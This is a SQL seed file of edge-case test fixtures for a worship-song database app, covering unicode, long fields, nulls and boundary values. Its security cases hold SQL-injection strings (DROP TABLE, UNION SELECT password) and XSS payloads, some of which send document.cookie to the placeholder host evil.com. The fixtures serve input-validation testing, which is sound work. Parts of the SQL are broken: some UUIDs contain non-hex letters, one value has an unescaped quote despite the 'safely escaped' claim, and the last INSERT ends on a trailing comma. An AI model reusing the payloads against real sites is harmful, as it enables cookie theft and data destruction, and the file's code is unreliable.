-- HSA Songbook Edge Cases Test Fixtures
-- This file contains test data for edge cases including:
-- - Unicode characters (emojis, special characters, multiple languages)
-- - Very long text fields (max lengths)
-- - NULL values in optional fields
-- - Empty arrays
-- - Boundary values (0, negative numbers where applicable)
-- - Special characters in ChordPro format
-- - SQL injection attempts (safely escaped)
-- - HTML/JavaScript in text fields (for XSS testing)

BEGIN;

-- ==========================================
-- CLEAR EXISTING DATA (for test isolation)
-- ==========================================
TRUNCATE TABLE 
    public.setlist_items,
    public.setlists,
    public.arrangements,
    public.songs,
    public.user_roles,
    public.users,
    public.reviews,
    public.content_reports,
    public.moderation_log,
    public.role_audit_log
RESTART IDENTITY CASCADE;

-- ==========================================
-- EDGE CASE USERS
-- ==========================================
INSERT INTO public.users (id, email, username, full_name, avatar_url, provider, provider_id, metadata, created_at) VALUES
    -- User with minimal data
    ('11111111-1111-1111-1111-111111111111', 'minimal@test.com', NULL, NULL, NULL, NULL, NULL, NULL, NOW()),
    
    -- User with maximal data and unicode characters
    ('22222222-2222-2222-2222-222222222222', 'unicode@测试.com', '🎵user_음악가', 'José María García-Fernández 🎸', 'https://example.com/avatar.jpg', 'google', 'google_123456', '{"preferences": {"language": "ko-KR", "theme": "dark"}, "special_chars": "Test @#$%^&*()_+"}', NOW()),
    
    -- User with very long fields (testing field length limits)
    ('33333333-3333-3333-3333-333333333333', 'verylongusername@verylongdomainname.verylongtoplevedomainextension.com', 
     'this_is_a_very_long_username_that_tests_database_field_length_limits_and_should_be_handled_properly_by_our_validation_system',
     'This Is A Very Long Full Name That Contains Multiple Words And Should Test Our Database Field Length Validation And Display Logic In The User Interface Components',
     'https://verylongdomainname.verylongtoplevedomainextension.com/path/to/very/long/avatar/url/that/might/be/generated/by/some/content/delivery/network/service.jpg',
     'github', 'github_very_long_provider_id_123456789012345678901234567890', 
     '{"bio": "This is an extremely long biography that contains detailed information about the user, their musical background, preferences, and various other details that might be stored in the metadata field to test JSON handling and field length limits", "instruments": ["guitar", "piano", "violin", "drums", "saxophone", "trumpet", "flute", "clarinet"], "genres": ["classical", "jazz", "rock", "pop", "country", "blues", "electronic", "folk"]}', NOW()),
    
    -- User with potentially problematic characters (SQL injection attempts)
    ('44444444-4444-4444-4444-444444444444', 'injection@test.com', 'user''DROP TABLE users;--', 'Robert''); DROP TABLE users; --', NULL, 'email', 'email_456', '{"sql": "SELECT * FROM users WHERE id = ''1'' OR ''1''=''1''", "xss": "<script>alert(''XSS'')</script>"}', NOW()),
    
    -- User with HTML/JavaScript content (XSS testing)
    ('55555555-5555-5555-5555-555555555555', 'xss@test.com', '<script>alert("xss")</script>', '<img src=x onerror=alert("XSS")>Alert User</img>', 'javascript:alert("XSS")', 'malicious', '<script>alert("XSS")</script>', '{"xss_payload": "<script>document.cookie=''stolen''</script>", "html_content": "<b>Bold</b> <i>Italic</i> <u>Underlined</u>"}', NOW()),
    
    -- User with empty string fields
    ('66666666-6666-6666-6666-666666666666', 'empty@test.com', '', '', '', '', '', '{}', NOW()),
    
    -- Users for multilingual testing
    ('77777777-7777-7777-7777-777777777777', 'chinese@test.com', '用户名', '张三李四', NULL, 'wechat', 'wechat_中文用户', '{"language": "zh-CN", "region": "China"}', NOW()),
    ('88888888-8888-8888-8888-888888888888', 'arabic@test.com', 'مستخدم_عربي', 'محمد أحمد علي', NULL, 'facebook', 'fb_arabic_123', '{"language": "ar-SA", "rtl": true}', NOW()),
    ('99999999-9999-9999-9999-999999999999', 'russian@test.com', 'русский_пользователь', 'Иван Петрович Сидоров', NULL, 'vk', 'vk_russian_456', '{"language": "ru-RU", "cyrillic": true}', NOW()),
    
    -- User with special timezone and date edge cases
    ('aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa', 'timezone@test.com', 'timezone_user', 'Edge Case User', NULL, 'twitter', 'twitter_789', '{"timezone": "Pacific/Kiritimati", "created_at": "1970-01-01T00:00:00Z"}', '1970-01-01 00:00:00+00');

-- Assign various roles including edge cases
INSERT INTO public.user_roles (user_id, role, granted_by, granted_at, is_active, expires_at) VALUES
    ('22222222-2222-2222-2222-222222222222', 'admin', '22222222-2222-2222-2222-222222222222', NOW(), true, NULL),
    ('44444444-4444-4444-4444-444444444444', 'moderator', '22222222-2222-2222-2222-222222222222', NOW(), true, NOW() + INTERVAL '1 day'), -- Expires in 1 day
    ('55555555-5555-5555-5555-555555555555', 'user', '22222222-2222-2222-2222-222222222222', NOW(), false, NULL), -- Inactive role
    ('77777777-7777-7777-7777-777777777777', 'moderator', '22222222-2222-2222-2222-222222222222', '1999-12-31 23:59:59+00', true, '2000-01-01 00:00:00+00'); -- Expired role

-- ==========================================
-- EDGE CASE SONGS
-- ==========================================
INSERT INTO public.songs (
    id, title, slug, artist, alternative_titles, lyrics, themes, ccli, ccli_verified, 
    primary_ccli_id, composition_year, original_language, lyrics_source, lyrics_verified, 
    source, notes, auto_conversion_enabled, is_public, views, rating_average, rating_count, 
    created_by, created_at, updated_at, moderation_status, moderated_at, moderated_by, moderation_note
) VALUES
    -- Song with minimal required fields only
    (
        'bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb',
        'Minimal Song',
        'minimal-song',
        NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
        true, 0, NULL, 0,
        '11111111-1111-1111-1111-111111111111',
        NOW(), NOW(), 'pending', NULL, NULL, NULL
    ),
    
    -- Song with unicode and emoji characters
    (
        'cccccccc-cccc-cccc-cccc-cccccccccccc',
        '🎵 찬양하세요 주님을 (Praise the Lord) 🙏',
        'praise-lord-korean-emoji',
        'José María García & 김민수 🎸',
        ARRAY['🎵 Praise Song', '찬양곡', 'Canción de Alabanza', 'أغنية المدح'],
        '{"en": {"verses": ["Praise the Lord with all your heart 💖", "Sing to Him a joyful song 🎶"]}, "ko": {"verses": ["온 마음으로 주님을 찬양하세요", "기쁜 노래로 주님께 찬송하세요"]}, "es": {"verses": ["Alaba al Señor con todo tu corazón", "Cántale una canción alegre"]}}',
        ARRAY['찬양', 'praise', 'alabanza', '赞美', 'الحمد', '🎵music', '❤️love'],
        '7068424',
        true,
        'CCLI-7068424-VERIFIED',
        2023,
        'ko',
        'https://ccli.com/songs/7068424',
        true,
        'CCLI Database',
        'Multi-language worship song with emoji support 🌍',
        true,
        true,
        9999,
        5.0,
        100,
        '22222222-2222-2222-2222-222222222222',
        NOW(),
        NOW(),
        'approved',
        NOW(),
        '22222222-2222-2222-2222-222222222222',
        'Approved for multilingual testing'
    ),
    
    -- Song with maximum length fields
    (
        'dddddddd-dddd-dddd-dddd-dddddddddddd',
        'This Is An Extremely Long Song Title That Tests The Database Field Length Limits And Should Be Handled Properly By All Our Validation Systems And User Interface Components Without Breaking The Layout Or Causing Display Issues In Various Screen Sizes And Device Types Including Mobile Phones Tablets And Desktop Computers',
        'extremely-long-title-testing-database-field-limits-validation-systems',
        'An Artist With A Very Long Name That Includes Multiple Words And Should Test Our Database Field Length Validation Including Special Characters Like Hyphens Apostrophes And Other Punctuation Marks That Might Be Found In Real Artist Names From Various Cultural Backgrounds',
        ARRAY[
            'Alternative Title Number One That Is Also Very Long',
            'Alternative Title Number Two With Even More Words',
            'Alternative Title Number Three Including Special Characters !@#$%',
            'Alternative Title Number Four With Unicode Characters 你好世界',
            'Alternative Title Number Five Testing Maximum Array Length'
        ],
        '{"en": {"verses": ["This is verse number one with a lot of text content that should test the JSON field storage capabilities and ensure that very long lyrical content can be properly stored retrieved and displayed without any truncation or data loss issues", "This is verse number two continuing with more extensive lyrical content that includes various punctuation marks exclamation points question marks and other special characters that might be found in real song lyrics", "This is verse number three with even more content including numbers 1 2 3 4 5 and symbols like & * + - = / \\ | @ # $ % ^ ( ) [ ] { } < > ~ ` that should all be properly escaped and stored"], "chorus": ["This is the chorus section with repetitive content that might be very long and include multiple lines of text that need to be properly formatted and displayed in the user interface without causing any layout issues or breaking the design"], "bridge": ["This is the bridge section with additional lyrical content that serves as a test for the JSON structure and ensures that all song sections can handle extensive text content without any problems"]}}',
        ARRAY[
            'theme-number-one-with-many-words',
            'theme-number-two-testing-array-limits',
            'theme-number-three-with-special-characters-!@#$%^&*()',
            'theme-number-four-unicode-测试主题',
            'theme-number-five-very-long-theme-name-that-tests-individual-array-element-length-limits'
        ],
        '1234567890123456789012345678901234567890',
        true,
        'CCLI-VERY-LONG-PRIMARY-ID-12345678901234567890',
        1850,
        'en-GB',
        'https://verylongdomainname.example.com/path/to/very/long/url/that/might/be/used/for/lyrics/source/documentation/or/reference/materials/including/query/parameters?param1=value1&param2=value2&param3=value3',
        true,
        'A very comprehensive source description that includes detailed information about where the song originated from including historical context cultural background and any relevant documentation that might be useful for users who want to understand the complete background of this particular song',
        'These are extensive notes about the song that include performance instructions historical context cultural significance theological implications musical arrangement suggestions key changes tempo variations instrumentation recommendations and any other relevant information that musicians worship leaders and congregation members might find useful when preparing to perform or participate in this song during worship services or other musical events',
        true,
        true,
        2147483647, -- Maximum integer value
        4.85,
        999999,
        '33333333-3333-3333-3333-333333333333',
        NOW(),
        NOW(),
        'approved',
        NOW(),
        '22222222-2222-2222-2222-222222222222',
        'Approved after extensive review of the extremely long content fields'
    ),
    
    -- Song with SQL injection attempts
    (
        'eeeeeeee-eeee-eeee-eeee-eeeeeeeeeeee',
        'Song''; DROP TABLE songs; --',
        'sql-injection-test-song',
        'Artist'') OR 1=1; --',
        ARRAY['Alternative''; DELETE FROM arrangements; --', 'Title'' UNION SELECT * FROM users; --'],
        '{"malicious": {"verses": ["SELECT * FROM users WHERE password = ''''", "'' OR 1=1; DROP TABLE songs; --"]}}',
        ARRAY['theme''; DROP DATABASE songbook; --', 'worship'' UNION ALL SELECT password FROM users --'],
        '12345''; INSERT INTO admin_users VALUES (''hacker'', ''password''); --',
        false,
        'CCLI''; UPDATE users SET role=''admin'' WHERE email=''hacker@evil.com''; --',
        2023,
        'en',
        'https://evil.com/'; DROP TABLE lyrics_sources; --',
        false,
        'Source''; EXEC sp_configure ''show advanced options'', 1; --',
        'Notes containing SQL: SELECT password FROM users; /* Comment */',
        true,
        true,
        0,
        1.0,
        1,
        '44444444-4444-4444-4444-444444444444',
        NOW(),
        NOW(),
        'flagged',
        NOW(),
        '22222222-2222-2222-2222-222222222222',
        'Flagged for potential SQL injection content'
    ),
    
    -- Song with XSS attempts
    (
        'ffffffff-ffff-ffff-ffff-ffffffffffff',
        '<script>alert("XSS in title")</script>Song Title',
        'xss-test-song',
        '<img src=x onerror=alert("XSS")>Artist Name',
        ARRAY['<script>document.location="http://evil.com"</script>', '<iframe src="javascript:alert(\'XSS\')"></iframe>'],
        '{"xss": {"verses": ["<script>alert(\"XSS in lyrics\")</script>", "<img src=x onerror=alert(\"Image XSS\")>", "javascript:alert(\"JavaScript URL\")"]}}',
        ARRAY['<script>alert("theme XSS")</script>', '<svg onload=alert("SVG XSS")>'],
        '<script>alert("XSS in CCLI")</script>123456',
        false,
        '<script>alert("Primary CCLI XSS")</script>',
        2023,
        'en',
        'javascript:alert("XSS in source URL")',
        false,
        '<script>document.cookie="stolen"</script>Source',
        '<script>window.location="http://evil.com?cookies="+document.cookie</script>Notes',
        true,
        true,
        0,
        1.0,
        1,
        '55555555-5555-5555-5555-555555555555',
        NOW(),
        NOW(),
        'rejected',
        NOW(),
        '22222222-2222-2222-2222-222222222222',
        'Rejected due to XSS content'
    ),
    
    -- Song with empty arrays and null values
    (
        'gggggggg-gggg-gggg-gggg-gggggggggggg',
        'Empty Fields Song',
        'empty-fields-song',
        '',
        ARRAY[]::TEXT[],
        '{}',
        ARRAY[]::TEXT[],
        '',
        NULL,
        '',
        NULL,
        '',
        '',
        NULL,
        '',
        '',
        NULL,
        true,
        0,
        NULL,
        0,
        '66666666-6666-6666-6666-666666666666',
        NOW(),
        NOW(),
        'pending',
        NULL,
        NULL,
        ''
    ),
    
    -- Song with boundary year values
    (
        'hhhhhhhh-hhhh-hhhh-hhhh-hhhhhhhhhhhh',
        'Ancient Song',
        'ancient-song-boundary-test',
        'Ancient Composer',
        NULL,
        '{"en": {"verses": ["Ancient lyrics from the past"]}}',
        ARRAY['ancient', 'historical'],
        NULL,
        false,
        NULL,
        1, -- Very old year
        'la', -- Latin
        NULL,
        false,
        NULL,
        'Testing boundary year value',
        true,
        true,
        -1, -- Negative views (should be handled)
        0.0,
        0,
        '77777777-7777-7777-7777-777777777777',
        '0001-01-01 00:00:00+00', -- Very old date
        NOW(),
        'approved',
        NOW(),
        '22222222-2222-2222-2222-222222222222',
        'Historical song for boundary testing'
    ),
    
    -- Song with future date (edge case)
    (
        'iiiiiiii-iiii-iiii-iiii-iiiiiiiiiiii',
        'Future Song',
        'future-song-date-test',
        'Future Composer',
        NULL,
        '{"en": {"verses": ["Song from the future"]}}',
        ARRAY['future', 'time-travel'],
        NULL,
        false,
        NULL,
        9999, -- Far future year
        'en',
        NULL,
        false,
        NULL,
        'Testing future date handling',
        true,
        true,
        0,
        NULL,
        0,
        '88888888-8888-8888-8888-888888888888',
        '2099-12-31 23:59:59+00', -- Future date
        '2099-12-31 23:59:59+00', -- Future update date
        'pending',
        NULL,
        NULL,
        NULL
    ),
    
    -- Song with special ChordPro characters
    (
        'jjjjjjjj-jjjj-jjjj-jjjj-jjjjjjjjjjjj',
        'ChordPro Special Characters Test',
        'chordpro-special-chars-test',
        'Test Artist',
        NULL,
        '{"chordpro": "This song contains ChordPro syntax: {title:Test} {key:C} {capo:3} [C]Chord [F/A]slash [Cm7b5]complex {comment:Special characters !@#$%^&*()_+} {start_of_chorus} {end_of_chorus}"}',
        ARRAY['test', 'chordpro'],
        NULL,
        false,
        NULL,
        2023,
        'en',
        NULL,
        false,
        NULL,
        'Testing ChordPro parsing with special characters',
        true,
        true,
        0,
        NULL,
        0,
        '99999999-9999-9999-9999-999999999999',
        NOW(),
        NOW(),
        'approved',
        NOW(),
        '22222222-2222-2222-2222-222222222222',
        'ChordPro syntax testing'
    );

-- ==========================================
-- EDGE CASE ARRANGEMENTS
-- ==========================================
INSERT INTO public.arrangements (
    id, song_id, name, slug, chord_data, description, difficulty, 
    key, tempo, time_signature, tags, is_public, views, rating_average, rating_count,
    created_by, created_at, updated_at, moderation_status, moderated_at, moderated_by, moderation_note
) VALUES
    -- Arrangement with minimal data
    (
        'cccccccc-1111-1111-1111-111111111111',
        'bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb',
        'Simple',
        'simple',
        '{title:Minimal Song}
{key:C}
[C]Simple chord progression [G]with basic [F]chords [C]only',
        NULL, NULL, NULL, NULL, NULL, NULL,
        true, 0, NULL, 0,
        '11111111-1111-1111-1111-111111111111',
        NOW(), NOW(), 'pending', NULL, NULL, NULL
    ),
    
    -- Arrangement with maximum complexity and unicode
    (
        'cccccccc-2222-2222-2222-222222222222',
        'cccccccc-cccc-cccc-cccc-cccccccccccc',
        '🎸 복잡한 편곡 (Complex Arrangement) 🎹',
        'complex-korean-arrangement',
        '{title:🎵 찬양하세요 주님을 (Praise the Lord) 🙏}
{subtitle:복잡한 화성 편곡}
{artist:José María García & 김민수 🎸}
{key:F#m}
{capo:4}
{tempo:132}
{time:7/8}
{comment:이 편곡은 복잡한 화성과 리듬을 포함합니다}
{meta:difficulty advanced}
{meta:instruments guitar piano strings}

{start_of_verse}
복잡한 [F#m(add9)]화성과 [C#7sus4/G#]진행으로 [Bmaj7#11]구성된 [E9sus4]편곡
With complex [F#m(add9)]harmonies and [C#7sus4/G#]progressions [Bmaj7#11]throughout [E9sus4]
{end_of_verse}

{start_of_chorus}
[F#m]찬양하세요 [D(add9)]주님을 온 [A/C#]마음으로 🎵
[E/G#]Praise the [F#m]Lord with [D(add9)]all your [A/C#]heart 💖
{end_of_chorus}

{comment:Bridge section with key change}
{start_of_bridge:Key of G minor}
[Gm]Modulation to [Dm/F]relative [Eb]major [Bb/D]
{end_of_bridge}

{comment:Special symbols and characters: ♩♪♫♬ ♯♭♮ 𝄞𝄢}
{comment:Tempo markings: Allegro con spirito ♩=132}',
        'Advanced arrangement with complex harmonies, key changes, and multilingual lyrics. Includes Korean text, emoji characters, and sophisticated chord progressions suitable for experienced musicians.',
        'hard',
        'F#m',
        132,
        '7/8',
        ARRAY['복잡한', 'complex', '고급', 'advanced', '다국어', 'multilingual', '🎸guitar', '🎹piano', 'key-change', 'modulation'],
        true,
        1500,
        4.8,
        25,
        '22222222-2222-2222-2222-222222222222',
        NOW(),
        NOW(),
        'approved',
        NOW(),
        '22222222-2222-2222-2222-222222222222',
        'Approved complex multilingual arrangement'
    ),
    
    -- Arrangement with SQL injection attempts
    (
        'cccccccc-3333-3333-3333-333333333333',
        'eeeeeeee-eeee-eeee-eeee-eeeeeeeeeeee',
        'Arrangement''; DROP TABLE arrangements; --',
        'sql-injection-arrangement',
        '{title:Song''; DROP TABLE songs; --}
{key:C'') OR 1=1; --}
{comment:SELECT * FROM users WHERE password = ''''}
[C''; DELETE FROM setlists; --]Test [F'') UNION SELECT password FROM users; --]chord
{start_of_chorus''; INSERT INTO admin (user) VALUES (''hacker''); --}
Malicious [G'') OR EXISTS(SELECT * FROM admin WHERE user=''hacker''); --]content
{end_of_chorus}',
        'Description with SQL: SELECT * FROM arrangements; /* Injection attempt */',
        'easy',
        'C''; TRUNCATE TABLE songs; --',
        120,
        '4/4''; DROP DATABASE songbook; --',
        ARRAY['tag''; DELETE FROM tags; --', 'theme'') UNION ALL SELECT credit_card FROM users; --'],
        true,
        0,
        1.0,
        1,
        '44444444-4444-4444-4444-444444444444',
        NOW(),
        NOW(),
        'flagged',
        NOW(),
        '22222222-2222-2222-2222-222222222222',
        'Flagged arrangement with SQL injection attempts'
    ),
    
    -- Arrangement with XSS attempts
    (
        'cccccccc-4444-4444-4444-444444444444',
        'ffffffff-ffff-ffff-ffff-ffffffffffff',
        '<script>alert("XSS")</script>Arrangement',
        'xss-arrangement-test',
        '{title:<img src=x onerror=alert("ChordPro XSS")>}
{comment:<script>document.location="http://evil.com"</script>}
[<script>alert("chord XSS")</script>C]Verse with [<iframe src="javascript:alert(1)"></iframe>F]XSS attempts
{start_of_chorus:<svg onload=alert("SVG XSS")>}
<script>window.location="http://evil.com?cookies="+document.cookie</script>
{end_of_chorus}',
        '<script>document.cookie="stolen"</script>XSS Description',
        'medium',
        'C<script>alert("key XSS")</script>',
        120,
        '4/4<img src=x onerror=alert("time XSS")>',
        ARRAY['<script>alert("tag XSS")</script>', '<img src=x onerror=alert("tag2")>'],
        true,
        0,
        1.0,
        1,
        '55555555-5555-5555-5555-555555555555',
        NOW(),
        NOW(),
        'rejected',
        NOW(),
        '22222222-2222-2222-2222-222222222222',
        'Rejected XSS arrangement'
    ),
    
    -- Arrangement with empty/null fields
    (
        'cccccccc-5555-5555-5555-555555555555',
        'gggggggg-gggg-gggg-gggg-gggggggggggg',
        '',
        'empty-arrangement',
        '{title:Empty Fields Song}
[C]Just basic chords [F]with empty [G]fields [C]',
        '',
        NULL,
        '',
        NULL,
        '',
        ARRAY[]::TEXT[],
        true,
        0,
        NULL,
        0,
        '66666666-6666-6666-6666-666666666666',
        NOW(),
        NOW(),
        'pending',
        NULL,
        NULL,
        ''
    ),
    
    -- Arrangement with boundary values
    (
        'cccccccc-6666-6666-6666-666666666666',
        'hhhhhhhh-hhhh-hhhh-hhhh-hhhhhhhhhhhh',
        'Extreme Values Test',
        'extreme-values',
        '{title:Ancient Song}
{key:C}
{tempo:1}
{time:1/1}
{capo:0}
{comment:Testing minimum values}
[C]Ancient [F]melody [G]with [C]history

{tempo:300}
{comment:Testing maximum tempo}
Very [C]fast [F]section [G]here [C]

{capo:20}
{comment:Testing high capo values}
Extreme [C]capo [F]position [G]test [C]',
        'Testing extreme tempo, capo, and other boundary values',
        'easy',
        'C',
        1, -- Minimum tempo
        '32/32', -- Complex time signature
        ARRAY['boundary-test', 'extreme-values', 'tempo-test'],
        true,
        -5, -- Negative views
        0.1, -- Very low rating
        1,
        '77777777-7777-7777-7777-777777777777',
        '0001-01-01 00:00:00+00',
        NOW(),
        'approved',
        NOW(),
        '22222222-2222-2222-2222-222222222222',
        'Boundary value testing arrangement'
    ),
    
    -- Arrangement with maximum length chord data
    (
        'cccccccc-7777-7777-7777-777777777777',
        'dddddddd-dddd-dddd-dddd-dddddddddddd',
        'Maximum Length ChordPro Test',
        'max-length-chordpro',
        '{title:This Is An Extremely Long Song Title That Tests The Database Field Length Limits}
{subtitle:With a very long subtitle that contains extensive information about the arrangement}
{artist:An Artist With A Very Long Name That Includes Multiple Words}
{album:An Album Title That Is Also Very Long And Contains Multiple Words And Phrases}
{key:C}
{capo:0}
{tempo:120}
{time:4/4}
{duration:05:30}
{meta:arranger A Very Long Arranger Name With Multiple Words}
{meta:copyright A Very Long Copyright Notice With Detailed Information}
{meta:license Creative Commons Attribution-ShareAlike 4.0 International License}
{comment:This is an extremely long comment that contains detailed performance notes, instructions for musicians, historical context about the song, cultural significance, theological implications, and various other relevant information that might be useful for worship leaders, musicians, and congregation members when preparing to perform this song}

{start_of_verse:Verse 1 with detailed instructions}
This is the [Cmaj7(add9)]first line of [Dm7/G]the verse with [Em7b5/A]very complex [Fmaj7#11]chord progressions [G13sus4]that test the [Am7(add9)]chord parsing [Bm7b5/E]capabilities and [Cmaj7(add9)]ensure that all [Dm7/G]chord types are [Em7b5/A]properly handled [Fmaj7#11]by the system [G13sus4]including extended [Am7(add9)]harmony chords [Bm7b5/E]with alterations
This is the [Cmaj7(add9)]second line with [Dm7/G]more complex [Em7b5/A]progressions that [Fmaj7#11]continue testing [G13sus4]the maximum [Am7(add9)]length capabilities [Bm7b5/E]of the chord [Cmaj7(add9)]data field and [Dm7/G]ensure that very [Em7b5/A]long arrangements [Fmaj7#11]can be stored [G13sus4]and retrieved [Am7(add9)]without any [Bm7b5/E]truncation
{end_of_verse}

{start_of_chorus:Chorus with even more complex harmonies}
This is the [Cmaj9(add#11)]chorus section [Dm13/G]with extremely [Em11b5/A]complex jazz [Fmaj7add6]harmonies and [G13alt]sophisticated [Am9(add11)]chord voicings [Bm11b5/E]that push the [Cmaj9(add#11)]limits of what [Dm13/G]can be stored [Em11b5/A]in the database [Fmaj7add6]field while [G13alt]maintaining proper [Am9(add11)]formatting and [Bm11b5/E]readability
The chorus [Cmaj9(add#11)]continues with [Dm13/G]additional lines [Em11b5/A]of complex [Fmaj7add6]harmonic content [G13alt]to further test [Am9(add11)]the storage [Bm11b5/E]capabilities and [Cmaj9(add#11)]ensure that [Dm13/G]maximum length [Em11b5/A]arrangements are [Fmaj7add6]properly handled [G13alt]by all system [Am9(add11)]components [Bm11b5/E]
{end_of_chorus}

{start_of_bridge:Bridge section with key modulation}
{comment:Key change to D major}
Now we [Dmaj9(add#11)]modulate to a [Em13/A]different key [F#m11b5/B]to test key [Gmaj7add6]change handling [A13alt]within the same [Bm9(add11)]arrangement and [C#m11b5/F#]ensure that [Dmaj9(add#11)]modulations are [Em13/A]properly displayed [F#m11b5/B]and formatted [Gmaj7add6]in the user [A13alt]interface [Bm9(add11)]components [C#m11b5/F#]
{end_of_bridge}

{comment:Additional comments and metadata for testing purposes}
{comment:Performance notes: This arrangement requires advanced musicians}
{comment:Instrumentation: Piano, guitar, bass, drums, strings}
{comment:Vocal range: F3 to G5}
{comment:Difficulty level: Expert}
{comment:Estimated performance time: 5 minutes 30 seconds}
{comment:Additional performance instructions and detailed notes about timing, dynamics, and interpretation}',
        'Arrangement with maximum length ChordPro data to test field limits and parsing capabilities',
        'hard',
        'C',
        120,
        '4/4',
        ARRAY[
            'maximum-length-test',
            'complex-harmony',
            'jazz-chords',
            'modulation',
            'expert-level'
        ],
        true,
        500,
        4.5,
        12,
        '33333333-3333-3333-3333-333333333333',
        NOW(),
        NOW(),
        'approved',
        NOW(),
        '22222222-2222-2222-2222-222222222222',
        'Approved maximum length arrangement for testing'
    );

-- ==========================================
-- EDGE CASE SETLISTS
-- ==========================================
INSERT INTO public.setlists (id, name, description, is_public, share_id, metadata, created_by, created_at, updated_at) VALUES
    -- Setlist with minimal data
    ('dddddddd-1111-1111-1111-111111111111', 'Simple', NULL, true, NULL, NULL, '11111111-1111-1111-1111-111111111111', NOW(), NOW()),
    
    -- Setlist with unicode and complex metadata
    ('dddddddd-2222-2222-2222-222222222222', 
     '🎵 한국어 예배 순서 (Korean Worship Order) 🙏', 
     'Complete worship service order with Korean and English songs, including special instructions for multilingual congregation 🌍',
     true, 
     'KR2023WS', 
     '{"language": "ko", "duration_minutes": 45, "special_notes": "Include translation slides", "instruments": ["piano", "guitar", "violin"], "vocalists": ["soprano", "alto", "tenor", "bass"], "themes": ["찬양", "경배", "감사"], "difficulty": "intermediate", "congregation_size": "large"}',
     '22222222-2222-2222-2222-222222222222', 
     NOW(), 
     NOW()),
    
    -- Setlist with SQL injection attempts
    ('dddddddd-3333-3333-3333-333333333333', 
     'Setlist''; DROP TABLE setlists; --', 
     'Description with SQL: SELECT * FROM users; /* Injection */', 
     true, 
     'HACK''; DELETE FROM songs; --', 
     '{"malicious": "SELECT password FROM users WHERE id = 1 OR 1=1", "sql": "\') OR 1=1; --"}',
     '44444444-4444-4444-4444-444444444444', 
     NOW(), 
     NOW()),
    
    -- Setlist with XSS attempts
    ('dddddddd-4444-4444-4444-444444444444', 
     '<script>alert("XSS")</script>Setlist Name', 
     '<img src=x onerror=alert("XSS Description")>Service Order', 
     true, 
     '<script>alert("share")</script>', 
     '{"xss": "<script>document.location=''http://evil.com''</script>", "html": "<iframe src=''javascript:alert(1)''></iframe>"}',
     '55555555-5555-5555-5555-555555555555', 
     NOW(), 
     NOW()),
    
    -- Setlist with empty fields
    ('dddddddd-5555-5555-5555-555555555555', '', '', false, '', '{}', '66666666-6666-6666-6666-666666666666', NOW(), NOW()),
    
    -- Setlist with maximum length fields
    ('dddddddd-6666-6666-6666-666666666666',
     'This Is An Extremely Long Setlist Name That Tests The Database Field Length Limits And Should Be Handled Properly By All Our Validation Systems And User Interface Components Without Breaking The Layout Or Causing Display Issues',
     'This is an extremely long setlist description that contains detailed information about the worship service including the order of songs performance instructions special notes for musicians and worship leaders congregation participation guidelines timing information technical requirements equipment setup instructions and any other relevant details that might be necessary for successful execution of the worship service in various contexts and environments including different venue types sound systems lighting configurations and congregation sizes while ensuring that all participants have clear understanding of their roles and responsibilities throughout the service',
     true,
     'MAXLENGTH123456789012345678901234567890',
     '{"detailed_metadata": {"service_type": "Sunday Morning Worship", "duration": "75 minutes", "theme": "Thanksgiving and Gratitude", "scripture_readings": ["Psalm 100", "1 Thessalonians 5:16-18", "Colossians 3:15-17"], "special_instructions": "This service includes extended time for congregational singing, prayer, and reflection. Musicians should be prepared for potential key changes and tempo adjustments based on congregational response. Sound technicians should monitor levels carefully during the quieter reflective moments and be ready to adjust microphone levels for spontaneous prayer or testimony sharing.", "equipment_needed": ["Piano", "Acoustic Guitar", "Electric Guitar", "Bass Guitar", "Drum Kit", "Violin", "Cello", "Microphones (8)", "In-ear Monitors", "Projection System"], "personnel": {"worship_leader": "Lead Pastor", "musicians": ["Pianist", "Guitarist 1", "Guitarist 2", "Bassist", "Drummer", "Violinist", "Cellist"], "vocalists": ["Soprano Lead", "Alto Support", "Tenor Support", "Bass Support"], "technical": ["Sound Engineer", "Lighting Technician", "Projection Operator"]}, "special_considerations": ["Wheelchair accessibility ensured", "Sign language interpreter available", "Large print materials provided", "Audio loop system active", "Children participation encouraged"]}}',
     '33333333-3333-3333-3333-333333333333',
     NOW(),
     NOW()),
    
    -- Private setlist for permission testing
    ('dddddddd-7777-7777-7777-777777777777', 'Private Setlist', 'This should only be visible to the owner', false, 'PRIVATE789', '{"privacy": "owner_only"}', '77777777-7777-7777-7777-777777777777', NOW(), NOW());

-- ==========================================
-- EDGE CASE SETLIST ITEMS
-- ==========================================
INSERT INTO public.setlist_items (id, setlist_id, arrangement_id, position, transpose_steps, notes, created_at) VALUES
    -- Basic items
    ('eeeeeeee-1111-1111-1111-111111111111', 'dddddddd-1111-1111-1111-111111111111', 'cccccccc-1111-1111-1111-111111111111', 1, 0, NULL, NOW()),
    ('eeeeeeee-1112-1112-1112-111211121112', 'dddddddd-1111-1111-1111-111111111111', NULL, 2, 0, 'Song without arrangement - congregation sings acapella', NOW()),
    
    -- Items with extreme transpose values
    ('eeeeeeee-2111-2111-2111-211121112111', 'dddddddd-2222-2222-2222-222222222222', 'cccccccc-2222-2222-2222-222222222222', 1, -12, 'Transpose down full octave 🎵', NOW()),
    ('eeeeeeee-2222-2222-2222-222222222222', 'dddddddd-2222-2222-2222-222222222222', 'cccccccc-6666-6666-6666-666666666666', 2, 12, 'Transpose up full octave', NOW()),
    ('eeeeeeee-2233-2233-2233-223322332233', 'dddddddd-2222-2222-2222-222222222222', 'cccccccc-1111-1111-1111-111111111111', 3, 25, 'Extreme positive transpose', NOW()),
    ('eeeeeeee-2244-2244-2244-224422442244', 'dddddddd-2222-2222-2222-222222222222', 'cccccccc-5555-5555-5555-555555555555', 4, -25, 'Extreme negative transpose', NOW()),
    
    -- Items with malicious content in notes
    ('eeeeeeee-3333-3333-3333-333333333333', 'dddddddd-3333-3333-3333-333333333333', 'cccccccc-3333-3333-3333-333333333333', 1, 0, 'Notes with SQL: SELECT * FROM users; DROP TABLE arrangements; --', NOW()),
    ('eeeeeeee-4444-4444-4444-444444444444', 'dddddddd-4444-4444-4444-444444444444', 'cccccccc-4444-4444-4444-444444444444', 1, 0, '<script>alert("XSS in notes")</script><img src=x onerror=alert("Image XSS")>', NOW()),
    
    -- Item with empty notes
    ('eeeeeeee-5555-5555-5555-555555555555', 'dddddddd-5555-5555-5555-555555555555', 'cccccccc-5555-5555-5555-555555555555', 1, 0, '', NOW()),
    
